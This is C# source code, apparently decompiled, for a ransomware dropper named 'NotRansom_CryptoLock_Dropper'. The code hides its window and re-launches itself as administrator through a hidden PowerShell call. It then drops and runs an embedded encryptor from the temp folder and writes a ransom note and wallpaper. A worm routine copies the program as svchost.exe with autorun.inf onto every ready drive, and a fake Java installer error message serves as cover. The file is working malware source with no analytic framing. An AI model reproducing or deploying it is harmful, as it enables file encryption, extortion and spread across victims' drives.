using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Windows.Forms;

namespace NotRansom_CryptoLock_Dropper;

public class Form1 : Form
{
	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		using Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void worm()
	{
		try
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			for (int i = 0; i < text.Length; i++)
			{
				if (new DriveInfo(text[i].ToString()).IsReady)
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Path.Combine(text[i] + ":\\", "svchost.exe"), overwrite: true);
					Extract("NotRansom_CryptoLock_Dropper", Path.Combine(text[i] + ":\\"), "Resources", "autorun.inf");
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private bool IsAdministrator()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		if (!IsAdministrator())
		{
			Process process = new Process();
			process.StartInfo.FileName = "powershell.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Arguments = "start-process " + Assembly.GetExecutingAssembly().Location + " -verb runas";
			process.Start();
			Environment.Exit(0);
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string tempPath = Path.GetTempPath();
			Path.Combine(tempPath, "WallPaper.jpg");
			Extract("NotRansom_CryptoLock_Dropper", folderPath, "Resources", "d.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", folderPath, "Resources", "e.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", folderPath, "Resources", "n.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", folderPath, "Resources", "w.nrcl");
			File.Copy(Path.Combine(folderPath, "e.nrcl"), Path.Combine(tempPath, "NRCL_Encryptor.exe"), overwrite: true);
			File.Copy(Path.Combine(folderPath, "w.nrcl"), Path.Combine(tempPath, "WallPaper.jpg"), overwrite: true);
			File.Copy(Path.Combine(folderPath, "n.nrcl"), Path.Combine(folderPath, "note.txt"), overwrite: true);
			Process.Start(Path.Combine(tempPath, "NRCL_Encryptor.exe"));
			worm();
		}
		catch (Exception)
		{
			MessageBox.Show("JavaInstaller Failed...", "Java", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		Environment.Exit(0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Cursor(Cursors.get_Arrow());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
